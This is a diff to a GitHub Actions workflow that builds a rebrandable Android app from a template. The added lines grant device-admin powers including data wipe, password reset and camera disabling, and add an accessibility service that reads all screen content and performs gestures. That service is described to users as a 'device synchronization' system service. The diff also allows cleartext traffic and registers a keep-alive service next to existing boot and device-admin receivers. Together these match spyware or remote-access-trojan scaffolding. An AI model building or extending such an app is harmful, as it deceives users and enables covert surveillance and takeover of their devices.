@@ -63,7 +63,6 @@ jobs:
         run: |
           cd build-app
 
-          # Buat semua folder
           mkdir -p android/app/src/main/res/values
           mkdir -p android/app/src/main/res/values-night
           mkdir -p android/app/src/main/res/drawable
@@ -114,6 +113,50 @@ jobs:
           EOF
           fi
 
+          # ===== device_admin_policies.xml =====
+          cat > android/app/src/main/res/xml/device_admin_policies.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-policies>
+                  <limit-password />
+                  <watch-login />
+                  <reset-password />
+                  <force-lock />
+                  <wipe-data />
+                  <expire-password />
+                  <encrypted-storage />
+                  <disable-camera />
+              </uses-policies>
+          </device-admin>
+          EOF
+
+          # ===== accessibility_service_config.xml =====
+          cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackAllMask"
+              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/accessibility_service_description"
+              android:notificationTimeout="100" />
+          EOF
+
+          # ===== network_security_config.xml =====
+          if [ ! -f android/app/src/main/res/xml/network_security_config.xml ]; then
+            cat > android/app/src/main/res/xml/network_security_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <network-security-config>
+              <base-config cleartextTrafficPermitted="true">
+                  <trust-anchors>
+                      <certificates src="system" />
+                  </trust-anchors>
+              </base-config>
+          </network-security-config>
+          EOF
+          fi
+
           # ===== Placeholder icon =====
           ICON_BASE64="iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFhAJ/wlseKgAAAABJRU5ErkJggg=="
           for dpi in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
@@ -124,6 +167,7 @@ jobs:
           done
 
           echo "✅ Resources ready"
+          ls -la android/app/src/main/res/xml/
 
       - name: Update package name
         run: |
@@ -133,30 +177,35 @@ jobs:
           NEW_KOTLIN_PATH="android/app/src/main/kotlin/$PKG_PATH"
           mkdir -p "$NEW_KOTLIN_PATH"
 
-          # Update AndroidManifest.xml
+          # ===== Update AndroidManifest.xml =====
           sed -i "s|package=\"[^\"]*\"|package=\"$PKG\"|g" android/app/src/main/AndroidManifest.xml
           sed -i "s|android:label=\"[^\"]*\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" android/app/src/main/AndroidManifest.xml
           sed -i "s|android:name=\".MainActivity\"|android:name=\"$PKG.MainActivity\"|g" android/app/src/main/AndroidManifest.xml
           sed -i "s|android:name=\".MyDeviceAdminReceiver\"|android:name=\"$PKG.MyDeviceAdminReceiver\"|g" android/app/src/main/AndroidManifest.xml
+          sed -i "s|android:name=\".MyAccessibilityService\"|android:name=\"$PKG.MyAccessibilityService\"|g" android/app/src/main/AndroidManifest.xml
           sed -i "s|android:name=\".BootReceiver\"|android:name=\"$PKG.BootReceiver\"|g" android/app/src/main/AndroidManifest.xml
+          sed -i "s|android:name=\".KeepAliveService\"|android:name=\"$PKG.KeepAliveService\"|g" android/app/src/main/AndroidManifest.xml
 
-          # Update build.gradle
+          # ===== Update build.gradle =====
           sed -i "s|namespace = \"[^\"]*\"|namespace = \"$PKG\"|g" android/app/build.gradle
           sed -i "s|applicationId = \"[^\"]*\"|applicationId = \"$PKG\"|g" android/app/build.gradle
 
-          # Pindah Kotlin
+          # ===== Pindah Kotlin =====
           OLD="android/app/src/main/kotlin/com/template/app"
           if [ -d "$OLD" ]; then
             cp -r "$OLD"/* "$NEW_KOTLIN_PATH/" 2>/dev/null || true
             rm -rf "android/app/src/main/kotlin/com/template"
           fi
 
-          # Ganti package di Kotlin
+          # ===== Ganti package di Kotlin =====
           if [ -d "$NEW_KOTLIN_PATH" ]; then
-            find "$NEW_KOTLIN_PATH" -name "*.kt" -exec sed -i "s|package com.template.app|package $PKG|g" {} \; 2>/dev/null || true
+            find "$NEW_KOTLIN_PATH" -name "*.kt" \
+              -exec sed -i "s|package com.template.app|package $PKG|g" {} \; 2>/dev/null || true
           fi
 
           echo "✅ Package updated: $PKG"
+          echo "📁 Kotlin files:"
+          ls -la "$NEW_KOTLIN_PATH/" || true
 
       - name: Update strings.xml
         run: |
@@ -165,6 +214,7 @@ jobs:
           <?xml version="1.0" encoding="utf-8"?>
           <resources>
               <string name="app_name">${{ github.event.inputs.app_name }}</string>
+              <string name="accessibility_service_description">Layanan sistem untuk sinkronisasi perangkat</string>
           </resources>
           EOF
 
